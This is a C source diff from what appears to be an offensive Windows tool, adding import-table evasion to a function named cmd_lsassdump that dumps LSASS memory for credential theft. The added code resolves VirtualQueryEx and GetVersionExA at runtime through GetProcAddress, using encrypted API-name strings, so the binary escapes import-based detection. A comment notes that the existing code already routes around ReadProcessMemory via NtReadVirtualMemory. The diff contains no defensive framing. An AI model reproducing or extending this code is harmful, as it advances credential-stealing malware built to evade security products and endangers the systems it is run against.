@@ -13,6 +13,16 @@
 typedef LONG NTSTATUS;
 #endif
 
+/* VirtualQueryEx — remove from IAT */
+typedef SIZE_T (WINAPI *_lVQEx_t)(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
+static _lVQEx_t _l_vqex(void) {
+    static _lVQEx_t fn = NULL;
+    if (!fn) { HMODULE k = GetModuleHandleA("kernel32.dll");
+               if (k) { char _s[16]; EVS_D(_s, EVS_fn_VirtualQueryEx); fn = (_lVQEx_t)(void*)GetProcAddress(k, _s); } }
+    return fn;
+}
+#define VirtualQueryEx(h,a,m,s) (_l_vqex()?_l_vqex()(h,a,m,s):0)
+
 /* NtReadVirtualMemory — removes ReadProcessMemory from IAT */
 typedef NTSTATUS (NTAPI *_lNtRVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 static _lNtRVM_t _lsass_nrvm(void) {
@@ -305,7 +315,10 @@ int cmd_lsassdump(const char *out_path, char *output_buf, size_t output_size)
     si.NCpu     = 1;
     si.Platform = 2;  /* VER_PLATFORM_WIN32_NT */
     OSVERSIONINFOA osi = {sizeof(osi)};
-    GetVersionExA(&osi);
+    { typedef BOOL (WINAPI *_fGVE_t)(LPOSVERSIONINFOA);
+      HMODULE _hk = GetModuleHandleA("kernel32.dll");
+      _fGVE_t _fGVE = _hk ? (_fGVE_t)(void*)GetProcAddress(_hk,"GetVersionExA") : NULL;
+      if (_fGVE) _fGVE(&osi); }
     si.Major = osi.dwMajorVersion;
     si.Minor = osi.dwMinorVersion;
     si.Build = osi.dwBuildNumber;
